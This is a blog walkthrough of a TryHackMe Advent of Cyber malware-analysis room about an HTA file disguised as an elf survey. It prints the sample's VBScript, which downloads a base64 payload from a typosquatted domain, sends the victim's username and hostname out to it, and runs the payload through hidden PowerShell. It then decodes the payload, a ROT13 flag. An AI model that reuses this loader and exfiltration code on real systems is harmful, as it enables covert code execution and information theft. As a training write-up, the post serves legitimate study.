---
layout: post
title: Advent of Cyber - Day 21 - Malhare.exe
date: 2025-12-22 16:19 +0000
category: [Advent Of Cyber]
tags: [tryhackme, aoc, malware-analysis]
---
## HTA App - survey.hta
Starting off this room we have a single task file **survey.hta**.

This is a HTA application disguised as a Festive Elf Survey.
```html
<hta:application id="APP123080"
applicationname="Festival Elf Survey"
...
```

Taking an initial look we can see functions such as 
 - decodeBase64
 - RSBinaryToString
 - getQuestions

### getQuestions()

It looks like *getQuestions()* is a sneaky function that actually grabs the payload:
```vb
Function getQuestions()
    Dim IE, result, decoded, decodedString
    Set IE = CreateObject("InternetExplorer.Application")
    IE.navigate2 "http://survey.bestfestiivalcompany.com/survey_questions.txt"
    Do While IE.ReadyState < 4
    Loop
    result = IE.document.body.innerText
    IE.quit 		

    decoded = decodeBase64(result)
    decodedString = RSBinaryToString(decoded)
    Call provideFeedback(decodedString)
End Function
```

In here we can see its grabbing the "survey questions" from *survey,best**festiival**company,com/survey_questions.txt* which looks like a typosquatted domain due to the additional *i* in **festiival**. 

### provideFeedback(string)

This is then provided to the *provideFeedback(string)* function which actually calls powershell with our malicious payload:
```vb
Function provideFeedback(feedbackString)	
    Dim strHost, strUser, strDomain
    On Error Resume Next
    strHost = CreateObject("WScript.Network").ComputerName
    strUser = CreateObject("WScript.Network").UserName
    
    Dim IE
    Set IE = CreateObject("InternetExplorer.Application")
    IE.navigate2 "http://survey.bestfestiivalcompany.com/details?u=" & strUser & "?h=" & strHost
    Do While IE.ReadyState < 4
    Loop
    IE.quit	
                
    Dim runObject

    Set runObject = CreateObject("Wscript.Shell")
    runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False
    
End Function
```

In this function we can see its exfiltrating both logged in **UserName** and **ComputerName** via a GET request with query params to *http://survey,bestfestiivalcompany,com/details* and then finally it runs powershell.exe to execute the payload via **runObject.Run**.

### Encrypted Payload

The URL for the payload doesnt work but the contents are provided for us, it starts as a Base64 string:
```
ZnVuY3Rpb24gQUFCQiB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkpXQogICAgICAgIFtzdHJpbmddJFRleHQKICAgICkKCiAgICAkc2IgPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXIgJFRleHQuTGVuZ3RoCiAgICBmb3JlYWNoICgkY2ggaW4gJFRleHQuVG9DaGFyQXJyYXkoKSkgewogICAgICAgICRjID0gW2ludF1bY2hhcl0kY2gKCiAgICAgICAgaWYgKCRjIC1nZSA2NSAtYW5kICRjIC1sZSA5MCkgeyAgICAgICAgICAgCiAgICAgICAgICAgICRjID0gKCgkYyAtIDY1ICsgMTMpICUgMjYpICsgNjUKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkYyAtZ2UgOTcgLWFuZCAkYyAtbGUgMTIyKSB7ICAgICAgCiAgICAgICAgICAgICRjID0gKCgkYyAtIDk3ICsgMTMpICUgMjYpICsgOTcKICAgICAgICB9CgogICAgICAgIFt2b2lkXSRzYi5BcHBlbmQoW2NoYXJdJGMpCiAgICB9CiAgICAkc2IuVG9TdHJpbmcoKQp9CgokZmxhZyA9ICdHVVp7Wm55am5lci5OYW55bGZycX0nCgokZGVjbyA9IEFBQkIgLVRleHQgJGZsYWcKV3JpdGUtT3V0cHV0ICRkZWNv
```

Using CyberChef to decode we can see this is actually a powershell blog:

```powershell
function AABB {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Text
    )

    $sb = New-Object System.Text.StringBuilder $Text.Length
    foreach ($ch in $Text.ToCharArray()) {
        $c = [int][char]$ch

        if ($c -ge 65 -and $c -le 90) {           
            $c = (($c - 65 + 13) % 26) + 65
        }
        elseif ($c -ge 97 -and $c -le 122) {      
            $c = (($c - 97 + 13) % 26) + 97
        }

        [void]$sb.Append([char]$c)
    }
    $sb.ToString()
}

$flag = 'GUZ{Znyjner.Nanylfrq}'

$deco = AABB -Text $flag
Write-Output $deco
```

There is additional encryption in this, this is using ROT13 to encode the data as we can see by the **+ 13** in the for loop. Using CyberChef we can easily decode the flag.

## Side Quest

Finally we have an additional file for the Side Quest 4 Key.

This is a pretty big file due to the encoded payload so I wont paste it here. 

Inside is a large base64 encoded payload split line by line, frustratingly you need to copy this out, tidy up the formatting so its just the base64 text and then decode it. 

For ease of use you can use:
```bash
base64 -d payload.txt > decoded.txt
```

This again decodes to a powershell blob with another encoded payload inside, this time it is XORed and the output is in decimal bytes. This should be enough for you to find the key.
Hint: **$k**